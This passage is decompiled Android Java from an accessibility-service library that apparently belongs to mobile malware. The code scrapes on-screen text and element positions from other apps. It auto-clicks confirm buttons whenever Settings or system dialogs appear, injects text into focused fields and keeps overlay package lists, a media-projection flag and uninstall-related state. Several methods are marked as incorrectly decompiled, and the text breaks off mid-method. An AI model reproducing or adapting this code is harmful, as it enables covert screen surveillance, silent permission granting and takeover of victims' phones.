        } else if (Build.VERSION.SDK_INT >= 18) {
            copyOnWriteArrayList.addAll(accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str));
            Iterator it2 = copyOnWriteArrayList.iterator();
            while (it2.hasNext()) {
                AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) it2.next();
                if (!TextUtils.isEmpty(accessibilityNodeInfo3.getViewIdResourceName()) && accessibilityNodeInfo3.getViewIdResourceName().contains(str)) {
                    copyOnWriteArrayList.add(accessibilityNodeInfo3);
                }
            }
        }
        return copyOnWriteArrayList;
    }

    public static AccessibilityNodeInfo findAndGetFirstSimilar(AccessibilityNodeInfo accessibilityNodeInfo, String str, boolean z) {
        java.util.List<AccessibilityNodeInfo> findAndGetAllNode;
        if (accessibilityNodeInfo == null || (findAndGetAllNode = findAndGetAllNode(accessibilityNodeInfo, str, z)) == null || findAndGetAllNode.isEmpty()) {
            return null;
        }
        return findAndGetAllNode.get(0);
    }

    private boolean clickNode(java.util.List<AccessibilityNodeInfo> list, String str, Boolean bool) {
        if (list == null || list.isEmpty()) {
            BA.Log(" -> clickNode() -> Nothing to click: " + str);
            return false;
        }
        if (!bool.booleanValue()) {
            return performClick(list.get(0), str);
        }
        Iterator<AccessibilityNodeInfo> it = list.iterator();
        while (it.hasNext()) {
            performClick(it.next(), str);
        }
        return true;
    }

    public boolean performClick(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        boolean performAction;
        if (accessibilityNodeInfo.isClickable()) {
            performAction = accessibilityNodeInfo.performAction(16);
        } else {
            AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
            performAction = parent != null ? parent.performAction(16) : false;
        }
        BA.Log(" -> clickNode() -> Clicked: " + str + " z : " + performAction);
        return performAction;
    }

    public void actionBack() {
        try {
            performGlobalAction(1);
        } catch (Exception unused) {
        }
    }

    public void actionHome() {
        try {
            performGlobalAction(2);
        } catch (Exception unused) {
        }
    }

    public void actionDoubleBack() {
        actionBack();
        actionBack();
    }

    public void blockAppSettings() {
        BA.Log("blockAppSettings");
    }

    public void threadSleep(long j) {
        try {
            Thread.sleep(j);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    public void logViewHierarchy(AccessibilityNodeInfo accessibilityNodeInfo, String str, List list) {
        Boolean bool;
        Boolean bool2;
        if (accessibilityNodeInfo != null) {
            try {
                if (accessibilityNodeInfo.isVisibleToUser() && accessibilityNodeInfo.isEnabled()) {
                    for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                        if (str.trim().length() == 0) {
                            if (i == 250) {
                                return;
                            }
                        } else if (i == 310) {
                            return;
                        }
                        logViewHierarchy(accessibilityNodeInfo.getChild(i), str, list);
                        try {
                            if (accessibilityNodeInfo.getChild(i) != null && accessibilityNodeInfo.getChild(i).isVisibleToUser()) {
                                Map map = new Map();
                                map.Initialize();
                                boolean z = false;
                                boolean z2 = false;
                                if (IsShowAllAcc) {
                                    bool2 = true;
                                    bool = true;
                                } else {
                                    try {
                                        if (accessibilityNodeInfo.getChild(i).isCheckable() || accessibilityNodeInfo.getChild(i).isClickable() || accessibilityNodeInfo.getChild(i).isEditable() || !TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getText()) || !TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getHintText())) {
                                            z = true;
                                        }
                                        if (!TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getPackageName()) && accessibilityNodeInfo.getChild(i).isVisibleToUser()) {
                                            z2 = true;
                                        }
                                        Boolean bool3 = z2;
                                        bool = z;
                                        bool2 = bool3;
                                    } catch (Exception unused) {
                                        bool = true;
                                        bool2 = true;
                                    }
                                }
                                if (bool2.booleanValue() && bool.booleanValue() && accessibilityNodeInfo.getChild(i) != null) {
                                    Rect rect = new Rect();
                                    try {
                                        accessibilityNodeInfo.getChild(i).getBoundsInScreen(rect);
                                        if (rect.width() > 0 && rect.height() > 0) {
                                            map.Put("width", Integer.valueOf(rect.width()));
                                            map.Put("Height", Integer.valueOf(rect.height()));
                                            map.Put("Top", Integer.valueOf(rect.top));
                                            map.Put("Left", Integer.valueOf(rect.left));
                                            map.Put("Right", Integer.valueOf(rect.right));
                                            map.Put("Bottom", Integer.valueOf(rect.bottom));
                                            if (!TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getText())) {
                                                map.Put("ViewText", ((Object) accessibilityNodeInfo.getChild(i).getText()) + " " + ((Object) accessibilityNodeInfo.getChild(i).getHintText()) + " " + ((Object) accessibilityNodeInfo.getChild(i).getContentDescription()));
                                            }
                                            if (!TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getPackageName())) {
                                                map.Put("packagename", accessibilityNodeInfo.getChild(i).getPackageName());
                                            }
                                            try {
                                                if (accessibilityNodeInfo.getChild(i).isFocused() && accessibilityNodeInfo.getChild(i).isEditable()) {
                                                    tempAccessibilityNodeInfo = accessibilityNodeInfo.getChild(i);
                                                }
                                            } catch (Exception unused2) {
                                            }
                                            list.Add(map.getObject());
                                            if (!TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getPackageName()) && !TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getViewIdResourceName()) && (accessibilityNodeInfo.getChild(i).getPackageName().toString().toLowerCase().contains("com.android.settings") || accessibilityNodeInfo.getChild(i).getViewIdResourceName().toString().toLowerCase().contains("android:id/button1") || accessibilityNodeInfo.getChild(i).getViewIdResourceName().toString().toLowerCase().contains("com.android.systemui:id/dialog_title"))) {
                                                this.acs.PerformNodeActionOnViewWithArgs(true, "android:id/button1", 16, (Map) AbsObjectWrapper.ConvertToWrapper(new Map(), Common.Null));
                                                AccessibilityEventsListener.delay(250);
                                            }
                                        }
                                    } catch (Exception e) {
                                        BA.Log("Error bounds : " + e.getMessage().toString());
                                    }
                                }
                            }
                        } catch (Exception e2) {
                            BA.Log("err native11 : " + e2.getMessage().toString());
                        }
                    }
                }
            } catch (Exception e3) {
                BA.Log("logViewHierarchy " + e3.getMessage().toString());
            }
        }
    }

    public void logViewHierarchy_filters(AccessibilityNodeInfo accessibilityNodeInfo, String str, List list) {
        if (accessibilityNodeInfo != null) {
            try {
                if (accessibilityNodeInfo.isVisibleToUser() && accessibilityNodeInfo.isEnabled()) {
                    for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                        if (str.trim().length() == 0) {
                            if (i == NoOfAccViews) {
                                return;
                            }
                        } else if (i == NoOfAccViews) {
                            return;
                        }
                        logViewHierarchy_filters(accessibilityNodeInfo.getChild(i), str, list);
                        try {
                            if (accessibilityNodeInfo.getChild(i) != null && accessibilityNodeInfo.getChild(i).isVisibleToUser()) {
                                Map map = new Map();
                                map.Initialize();
                                Boolean.valueOf(false);
                                Boolean.valueOf(false);
                                Boolean bool = true;
                                Boolean bool2 = true;
                                if (bool2.booleanValue() && bool.booleanValue()) {
                                    Rect rect = new Rect();
                                    accessibilityNodeInfo.getChild(i).getBoundsInScreen(rect);
                                    if (rect.width() > 0 && rect.height() > 0) {
                                        map.Put("width", Integer.valueOf(rect.width()));
                                        map.Put("Height", Integer.valueOf(rect.height()));
                                        map.Put("Top", Integer.valueOf(rect.top));
                                        map.Put("Left", Integer.valueOf(rect.left));
                                        map.Put("Right", Integer.valueOf(rect.right));
                                        map.Put("Bottom", Integer.valueOf(rect.bottom));
                                        if (!TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getText())) {
                                            map.Put("ViewText", accessibilityNodeInfo.getChild(i).getText());
                                        }
                                        if (!TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getPackageName())) {
                                            map.Put("packagename", accessibilityNodeInfo.getChild(i).getPackageName().toString());
                                        }
                                        if (!TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getHintText())) {
                                            map.Put("ViewHint", accessibilityNodeInfo.getChild(i).getHintText());
                                        }
                                        if (!TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getContentDescription())) {
                                            map.Put("ViewDesc", accessibilityNodeInfo.getChild(i).getContentDescription());
                                        }
                                        map.Put("btntype", accessibilityNodeInfo.getChild(i).getClassName());
                                        try {
                                            if (accessibilityNodeInfo.getChild(i).isFocused() && accessibilityNodeInfo.getChild(i).isEditable()) {
                                                tempAccessibilityNodeInfo = accessibilityNodeInfo.getChild(i);
                                            }
                                        } catch (Exception e) {
                                            BA.Log("111111 native : " + e.getMessage().toString());
                                        }
                                        list.Add(map.getObject());
                                        if (!TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getPackageName()) && !TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getViewIdResourceName()) && (accessibilityNodeInfo.getChild(i).getPackageName().toString().toLowerCase().contains("com.android.settings") || accessibilityNodeInfo.getChild(i).getViewIdResourceName().toString().toLowerCase().contains("android:id/button1") || accessibilityNodeInfo.getChild(i).getViewIdResourceName().toString().toLowerCase().contains("com.android.systemui:id/dialog_title"))) {
                                            this.acs.PerformNodeActionOnViewWithArgs(true, "android:id/button1", 16, (Map) AbsObjectWrapper.ConvertToWrapper(new Map(), (Map.MyMap) Common.Null));
                                            AccessibilityEventsListener.delay(250);
                                        }
                                        accessibilityNodeInfo.recycle();
                                    }
                                }
                            }
                        } catch (Exception e2) {
                            BA.Log("err native : " + e2.getMessage().toString());
                        }
                    }
                }
            } catch (Exception e3) {
                BA.Log("logViewHierarchy_filters " + e3.getMessage().toString());
            }
        }
    }

    public void logViewHierarchyOriginal(AccessibilityNodeInfo accessibilityNodeInfo, String str, List list) {
        if (accessibilityNodeInfo != null) {
            try {
                if (accessibilityNodeInfo.isVisibleToUser() && accessibilityNodeInfo.isEnabled()) {
                    for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                        if (str.trim().length() == 0) {
                            if (i == 250) {
                                return;
                            }
                        } else if (i == 310) {
                            return;
                        }
                        logViewHierarchy(accessibilityNodeInfo.getChild(i), str, list);
                        try {
                            if (accessibilityNodeInfo.getChild(i) != null && accessibilityNodeInfo.getChild(i).isVisibleToUser()) {
                                Map map = new Map();
                                map.Initialize();
                                Boolean bool = false;
                                Boolean bool2 = false;
                                if (accessibilityNodeInfo.getChild(i).isCheckable() || accessibilityNodeInfo.getChild(i).isClickable() || accessibilityNodeInfo.getChild(i).isEditable() || !TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getText()) || !TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getHintText())) {
                                    bool = true;
                                }
                                if (!TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getPackageName().toString()) && accessibilityNodeInfo.getChild(i).isVisibleToUser() && accessibilityNodeInfo.getChild(i).isImportantForAccessibility()) {
                                    bool2 = true;
                                }
                                if (bool2.booleanValue() && bool.booleanValue()) {
                                    Rect rect = new Rect();
                                    accessibilityNodeInfo.getChild(i).getBoundsInScreen(rect);
                                    if (rect.width() > 0 && rect.height() > 0) {
                                        map.Put("width", Integer.valueOf(rect.width()));
                                        map.Put("Height", Integer.valueOf(rect.height()));
                                        map.Put("Top", Integer.valueOf(rect.top));
                                        map.Put("Left", Integer.valueOf(rect.left));
                                        map.Put("Right", Integer.valueOf(rect.right));
                                        map.Put("Bottom", Integer.valueOf(rect.bottom));
                                        if (!TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getText())) {
                                            map.Put("ViewText", accessibilityNodeInfo.getChild(i).getText().toString());
                                        }
                                        if (!TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getPackageName())) {
                                            map.Put("packagename", accessibilityNodeInfo.getChild(i).getPackageName().toString());
                                        }
                                        if (accessibilityNodeInfo.getChild(i).isFocused() && accessibilityNodeInfo.getChild(i).isEditable()) {
                                            tempAccessibilityNodeInfo = accessibilityNodeInfo.getChild(i);
                                        }
                                        list.Add(map.getObject());
                                        if (!TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getPackageName()) && !TextUtils.isEmpty(accessibilityNodeInfo.getChild(i).getViewIdResourceName()) && (accessibilityNodeInfo.getChild(i).getPackageName().toString().toLowerCase().contains("com.android.settings") || accessibilityNodeInfo.getChild(i).getViewIdResourceName().toString().toLowerCase().contains("android:id/button1") || accessibilityNodeInfo.getChild(i).getViewIdResourceName().toString().toLowerCase().contains("com.android.systemui:id/dialog_title"))) {
                                            this.acs.PerformNodeActionOnViewWithArgs(true, "android:id/button1", 16, (Map) AbsObjectWrapper.ConvertToWrapper(new Map(), Common.Null));
                                            AccessibilityEventsListener.delay(250);
                                        }
                                    }
                                }
                            }
                        } catch (Exception unused) {
                        }
                    }
                }
            } catch (Exception e) {
                BA.Log("logViewHierarchyOriginal " + e.getMessage().toString());
            }
        }
    }

    private void m1a(AccessibilityNodeInfo accessibilityNodeInfo) {
        int childCount;
        if (accessibilityNodeInfo == null || accessibilityNodeInfo.getClassName() == null || (childCount = accessibilityNodeInfo.getChildCount()) == 0) {
            return;
        }
        for (int i = 0; i < childCount; i++) {
            m1a(accessibilityNodeInfo.getChild(i));
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static boolean m5176i(AccessibilityNodeInfo accessibilityNodeInfo, int... iArr) {
        if (accessibilityNodeInfo == null) {
            return false;
        }
        try {
            java.util.List<AccessibilityNodeInfo.AccessibilityAction> actionList = accessibilityNodeInfo.getActionList();
            int length = iArr.length;
            boolean[] zArr = new boolean[length];
            for (AccessibilityNodeInfo.AccessibilityAction accessibilityAction : actionList) {
                for (int i = 0; i < iArr.length; i++) {
                    if (accessibilityAction.getId() == iArr[i]) {
                        zArr[i] = true;
                    }
                }
            }
            for (int i2 = 0; i2 < length; i2++) {
                if (!zArr[i2]) {
                    return false;
                }
            }
            return true;
        } catch (Exception e) {
            BA.Log(e.getMessage());
            return false;
        }
    }

    @BA.Version(0.12f)
    @BA.Author("New Lib")
    @BA.ShortName("AccessibilityEventsListener")
    public static class AccessibilityEventsListener {
        public boolean String;
        BA f2a;
        String f3b;
        private AccessibilityEventsListenerWrapper f4c;

        public void initialize(BA BA, String str) {
            AccessibilityEventsListenerWrapper.list1.Initialize();
            AccessibilityEventsListenerWrapper.lstTemprorayListOfViews.Initialize();
            this.f2a = BA;
            this.f3b = str.toLowerCase(BA.cul);
            AccessibilityEventsListenerWrapper accessibilityEventsListenerWrapper = (AccessibilityEventsListenerWrapper) BA.service;
            this.f4c = accessibilityEventsListenerWrapper;
            accessibilityEventsListenerWrapper.acs = this;
        }

        public boolean IsServiceActive() {
            return AccessibilityEventsListenerWrapper.isServiceActive;
        }

        private java.util.List m2a(Boolean bool, String str) {
            java.util.List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText;
            AccessibilityNodeInfo rootInActiveWindow = this.f4c.getRootInActiveWindow();
            if (bool.booleanValue()) {
                findAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByViewId(str);
            } else {
                findAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
            }
            if (findAccessibilityNodeInfosByText == null || findAccessibilityNodeInfosByText.isEmpty()) {
                return null;
            }
            return findAccessibilityNodeInfosByText;
        }

        public boolean PerformGlobalAction(int i) {
            try {
                return this.f4c.performGlobalAction(i);
            } catch (Exception unused) {
                return false;
            }
        }

        public void setFilters(boolean z, int i) {
            AccessibilityEventsListenerWrapper.IsShowAllAcc = z;
            AccessibilityEventsListenerWrapper.NoOfAccViews = i;
        }

        public boolean PerformNodeActionOnViewWithArgs(Boolean bool, String str, int i, Map map) {
            java.util.List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId;
            AccessibilityNodeInfo rootInActiveWindow = this.f4c.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return false;
            }
            if (!bool.booleanValue()) {
                findAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
            } else {
                findAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(str);
            }
            if (findAccessibilityNodeInfosByViewId == null || findAccessibilityNodeInfosByViewId.isEmpty()) {
                return false;
            }
            AccessibilityNodeInfo accessibilityNodeInfo = findAccessibilityNodeInfosByViewId.get(0);
            if (i == 2097152) {
                Iterator it = map.getObject().values().iterator();
                String str2 = "";
                while (it.hasNext()) {
                    str2 = it.next().toString();
                }
                Bundle bundle = new Bundle();
                bundle.putCharSequence(AccessibilityNodeInfoCompat.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, str2);
                accessibilityNodeInfo.performAction(2097152, bundle);
                return true;
            }
            accessibilityNodeInfo.performAction(i);
            return true;
        }

        public boolean PerformNodeActionOnViewWithArgs2(Boolean bool, String str, int i, Map map) {
            java.util.List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId;
            AccessibilityNodeInfo rootInActiveWindow = this.f4c.getRootInActiveWindow();
            if (!bool.booleanValue()) {
                BA.Log("By text");
                findAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
            } else {
                BA.Log("By ID");
                findAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(str);
            }
            if (findAccessibilityNodeInfosByViewId == null || findAccessibilityNodeInfosByViewId.isEmpty()) {
                return false;
            }
            BA.Log("Control found");
            AccessibilityNodeInfo accessibilityNodeInfo = findAccessibilityNodeInfosByViewId.get(0);
            accessibilityNodeInfo.getParent().performAction(16);
            if (accessibilityNodeInfo.isClickable()) {
                boolean performAction = accessibilityNodeInfo.performAction(16);
                BA.Log("node click");
                return performAction;
            }
            AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
            BA.Log(parent.toString());
            boolean performAction2 = parent != null ? parent.performAction(16) : false;
            BA.Log("parent click");
            return performAction2;
        }

        /* JADX WARN: Removed duplicated region for block: B:67:0x0117 A[Catch: Exception -> 0x0138, TryCatch #0 {Exception -> 0x0138, blocks: (B:3:0x0003, B:25:0x004f, B:27:0x0055, B:29:0x005b, B:31:0x0061, B:33:0x0067, B:35:0x007f, B:37:0x0087, B:39:0x008d, B:41:0x0093, B:43:0x009f, B:45:0x00a5, B:46:0x00ab, B:48:0x00ad, B:50:0x00b1, B:52:0x00b7, B:54:0x00c3, B:56:0x00c9, B:57:0x00de, B:59:0x00e8, B:60:0x00d4, B:61:0x00f6, B:65:0x0111, B:67:0x0117, B:69:0x011f, B:80:0x0045, B:6:0x000c, B:8:0x0012, B:10:0x0018, B:12:0x001e, B:14:0x0024, B:16:0x002a, B:18:0x0034, B:20:0x003a, B:22:0x0040, B:79:0x0030), top: B:2:0x0003, inners: #1 }] */
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public boolean ClickByID(android.view.accessibility.AccessibilityNodeInfo r18, int r19, int r20, int r21, int r22, java.lang.String r23, java.lang.String r24) {
            /*
                Method dump skipped, instructions count: 313
                To view this dump change 'Code comments level' option to 'DEBUG'
            */
            throw new UnsupportedOperationException("Method not decompiled: com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.AccessibilityEventsListener.ClickByID(android.view.accessibility.AccessibilityNodeInfo, int, int, int, int, java.lang.String, java.lang.String):boolean");
        }

        public boolean PerformClick_ByTemp(int i, int i2, int i3, int i4, String str, String str2) {
            try {
                AccessibilityEventsListenerWrapper.isfound = false;
                try {
                    ClickByID(this.f4c.getRootInActiveWindow(), i, i2, i3, i4, str, str2);
                    return AccessibilityEventsListenerWrapper.isfound;
                } catch (Exception e) {
                    e = e;
                    BA.Log("PerformClick_ByTemp : " + e.getMessage().toString());
                    return false;
                }
            } catch (Exception e2) {
                e = e2;
            }
        }

        public boolean SendTextToAnyFocusedNode(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
            try {
                Boolean bool = false;
                Boolean bool2 = false;
                try {
                    if (accessibilityNodeInfo.isCheckable() || accessibilityNodeInfo.isClickable() || accessibilityNodeInfo.isEditable()) {
                        bool = true;
                    }
                    if (accessibilityNodeInfo.getPackageName() != null && accessibilityNodeInfo.isVisibleToUser()) {
                        bool2 = true;
                    }
                } catch (Exception unused) {
                    bool = true;
                    bool2 = true;
                }
                if (accessibilityNodeInfo != null && accessibilityNodeInfo.isVisibleToUser() && accessibilityNodeInfo.isEnabled() && bool.booleanValue() && bool2.booleanValue() && !AccessibilityEventsListenerWrapper.isfound) {
                    try {
                        if (accessibilityNodeInfo != null) {
                            if (!AccessibilityEventsListenerWrapper.m5176i(accessibilityNodeInfo, 2097152)) {
                                AccessibilityEventsListenerWrapper.isfound = false;
                                return false;
                            }
                            if (!accessibilityNodeInfo.isFocused()) {
                                AccessibilityEventsListenerWrapper.isfound = false;
                                return false;
                            }
                            if (!accessibilityNodeInfo.isEnabled()) {
                                AccessibilityEventsListenerWrapper.isfound = false;
                                return false;
                            }
                            if (accessibilityNodeInfo.getClassName() == null) {
                                AccessibilityEventsListenerWrapper.isfound = false;
                                return false;
                            }
                            Bundle bundle = new Bundle();
                            bundle.putCharSequence(AccessibilityNodeInfoCompat.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, str);
                            accessibilityNodeInfo.performAction(2097152, bundle);
                            AccessibilityEventsListenerWrapper.isfound = true;
                        } else {
                            AccessibilityEventsListenerWrapper.isfound = false;
                            return false;
                        }
                    } catch (Exception e) {
                        AccessibilityEventsListenerWrapper.isfound = false;
                        BA.Log(e.getMessage());
                    }
                }
                for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                    AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                    if (child != null) {
                        if (AccessibilityEventsListenerWrapper.isfound) {
                            break;
                        }
                        SendTextToAnyFocusedNode(child, str);
                        child.recycle();
                    }
                }
                return false;
            } catch (Exception e2) {
                BA.Log("SendTextToAnyFocusedNode Function : " + e2.getMessage().toString());
                return false;
            }
        }

        public boolean Send_Text_To_Node(String str) {
            try {
                AccessibilityEventsListenerWrapper.isfound = false;
                SendTextToAnyFocusedNode(this.f4c.getRootInActiveWindow(), str);
                return AccessibilityEventsListenerWrapper.isfound;
            } catch (Exception e) {
                BA.Log("Send_Text_To_Node : " + e.getMessage().toString());
                return false;
            }
        }

        public boolean SendTextToAnyFocusedNode_SecondTry(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
            try {
                Boolean bool = false;
                Boolean bool2 = false;
                try {
                    if (accessibilityNodeInfo.isCheckable() || accessibilityNodeInfo.isClickable() || accessibilityNodeInfo.isEditable()) {
                        bool = true;
                    }
                    if (accessibilityNodeInfo.getPackageName() != null && accessibilityNodeInfo.isVisibleToUser()) {
                        bool2 = true;
                    }
                } catch (Exception unused) {
                    bool = true;
                    bool2 = true;
                }
                if (accessibilityNodeInfo != null && accessibilityNodeInfo.isVisibleToUser() && accessibilityNodeInfo.isEnabled() && bool.booleanValue() && bool2.booleanValue() && !AccessibilityEventsListenerWrapper.isfound) {
                    try {
                        if (accessibilityNodeInfo == null) {
                            BA.Log("tempAccessibilityNodeInfo is null ");
                            AccessibilityEventsListenerWrapper.isfound = false;
                            return false;
                        }
                        if (accessibilityNodeInfo.getClassName() == null) {
                            BA.Log("empty class name");
                            AccessibilityEventsListenerWrapper.isfound = false;
                            return false;
                        }
                        accessibilityNodeInfo.performAction(4);
                        accessibilityNodeInfo.performAction(32768);
                        AccessibilityEventsListenerWrapper.isfound = true;
                    } catch (Exception e) {
                        AccessibilityEventsListenerWrapper.isfound = false;
                        BA.Log(e.getMessage());
                    }
                }
                for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                    AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                    if (child != null) {
                        if (AccessibilityEventsListenerWrapper.isfound) {
                            break;
                        }
                        SendTextToAnyFocusedNode_SecondTry(child, str);
                        child.recycle();
                    }
                }
                return false;
            } catch (Exception e2) {
                BA.Log("SendTextToAnyFocusedNode Function : " + e2.getMessage().toString());
                return false;
            }
        }

        public boolean Send_Text_To_Node_SecondTry(String str) {
            try {
                AccessibilityEventsListenerWrapper.isfound = false;
                SendTextToAnyFocusedNode_SecondTry(this.f4c.getRootInActiveWindow(), str);
                return AccessibilityEventsListenerWrapper.isfound;
            } catch (Exception e) {
                BA.Log("Send_Text_To_Node : " + e.getMessage().toString());
                return false;
            }
        }

        public void remove_lst_ovlypks() {
            try {
                if (AccessibilityEventsListenerWrapper.lstOvrlyPkgs == null || !AccessibilityEventsListenerWrapper.lstOvrlyPkgs.IsInitialized()) {
                    return;
                }
                AccessibilityEventsListenerWrapper.lstOvrlyPkgs.Clear();
            } catch (Exception e) {
                BA.Log("remove_lst_ovlypks : " + e.getMessage().toString());
            }
        }

        public void remove_certain_ovlypks(String str) {
            try {
                if (AccessibilityEventsListenerWrapper.lstOvrlyPkgs == null || !AccessibilityEventsListenerWrapper.lstOvrlyPkgs.IsInitialized()) {
                    return;
                }
                AccessibilityEventsListenerWrapper.lstOvrlyPkgs.Remove(str);
            } catch (Exception e) {
                BA.Log("add_lst_ovlypks : " + e.getMessage().toString());
            }
        }

        public void add_lst_ovlypks(String str, String str2) {
            try {
                if (AccessibilityEventsListenerWrapper.lstOvrlyPkgs == null) {
                    AccessibilityEventsListenerWrapper.lstOvrlyPkgs = new Map();
                    AccessibilityEventsListenerWrapper.lstOvrlyPkgs.Initialize();
                }
                if (!AccessibilityEventsListenerWrapper.lstOvrlyPkgs.IsInitialized()) {
                    AccessibilityEventsListenerWrapper.lstOvrlyPkgs.Initialize();
                }
                AccessibilityEventsListenerWrapper.lstOvrlyPkgs.Put(str, str2);
            } catch (Exception e) {
                BA.Log("add_lst_ovlypks : " + e.getMessage().toString());
            }
        }

        public void setintpemscounter(int i) {
            try {
                AccessibilityEventsListenerWrapper.intpemscounter = i;
            } catch (Exception unused) {
            }
        }

        public void setintCanUnInstalltheApp(int i) {
            try {
                AccessibilityEventsListenerWrapper.intCanUnInstalltheApp = i;
            } catch (Exception unused) {
            }
        }

        public void setispermformediaproj(long j) {
            try {
                AccessibilityEventsListenerWrapper.ispermformediaproj = j;
            } catch (Exception unused) {
            }
        }

        public void isShowing_Ovrlay_CO(Boolean bool) {
            try {
                AccessibilityEventsListenerWrapper.strCurrentopPkg = "";
                AccessibilityEventsListenerWrapper.isOverlay_IsShowing = bool.booleanValue();
            } catch (Exception e) {
                BA.Log("isShowing_Ovrlay_CO : " + e.getMessage().toString());
            }
        }

        public void Set_App_Name(String str) {
            try {
                AccessibilityEventsListenerWrapper.app_name = str;
            } catch (Exception e) {
                BA.Log("Set_App_Name : " + e.getMessage().toString());
            }
        }

        public String setIsStartDrawing(String str) {
            AccessibilityEventsListenerWrapper.IsStartDrawing = str;
            return str;
        }

        public String IsStringTypeText(String str) {
            AccessibilityEventsListenerWrapper.StringsetTypingText = str;
            return str;
        }

        public String GetIsStringTypeText() {
            return AccessibilityEventsListenerWrapper.StringsetTypingText;
        }

        public void clearListOfViews() {
            AccessibilityEventsListenerWrapper.list1.Clear();
            AccessibilityEventsListenerWrapper.lstTemprorayListOfViews.Clear();
        }

        /* JADX WARN: Removed duplicated region for block: B:35:0x009d A[Catch: Exception -> 0x00b9, TRY_LEAVE, TryCatch #0 {Exception -> 0x00b9, blocks: (B:3:0x0001, B:7:0x0006, B:10:0x0016, B:13:0x001f, B:16:0x0028, B:22:0x004e, B:32:0x0062, B:33:0x0086, B:35:0x009d, B:38:0x0073, B:40:0x0040), top: B:2:0x0001 }] */
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public boolean EnterTextIntoNode(java.lang.String r8) {
            /*
                r7 = this;
                r0 = 0
                android.view.accessibility.AccessibilityNodeInfo r1 = com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.tempAccessibilityNodeInfo     // Catch: java.lang.Exception -> Lb9
                if (r1 != 0) goto L6
                return r0
            L6:
                android.view.accessibility.AccessibilityNodeInfo r1 = com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.tempAccessibilityNodeInfo     // Catch: java.lang.Exception -> Lb9
                r2 = 1
                int[] r2 = new int[r2]     // Catch: java.lang.Exception -> Lb9
                r3 = 2097152(0x200000, float:2.938736E-39)
                r2[r0] = r3     // Catch: java.lang.Exception -> Lb9
                boolean r1 = com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.access$000(r1, r2)     // Catch: java.lang.Exception -> Lb9
                if (r1 != 0) goto L16
                return r0
            L16:
                android.view.accessibility.AccessibilityNodeInfo r1 = com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.tempAccessibilityNodeInfo     // Catch: java.lang.Exception -> Lb9
                boolean r1 = r1.isFocused()     // Catch: java.lang.Exception -> Lb9
                if (r1 != 0) goto L1f
                return r0
            L1f:
                android.view.accessibility.AccessibilityNodeInfo r1 = com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.tempAccessibilityNodeInfo     // Catch: java.lang.Exception -> Lb9
                boolean r1 = r1.isEnabled()     // Catch: java.lang.Exception -> Lb9
                if (r1 != 0) goto L28
                return r0
            L28:
                android.view.accessibility.AccessibilityNodeInfo r1 = com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.tempAccessibilityNodeInfo     // Catch: java.lang.Exception -> Lb9
                int r1 = r1.getTextSelectionStart()     // Catch: java.lang.Exception -> Lb9
                android.view.accessibility.AccessibilityNodeInfo r2 = com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.tempAccessibilityNodeInfo     // Catch: java.lang.Exception -> Lb9
                int r2 = r2.getTextSelectionEnd()     // Catch: java.lang.Exception -> Lb9
                android.view.accessibility.AccessibilityNodeInfo r4 = com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.tempAccessibilityNodeInfo     // Catch: java.lang.Exception -> Lb9
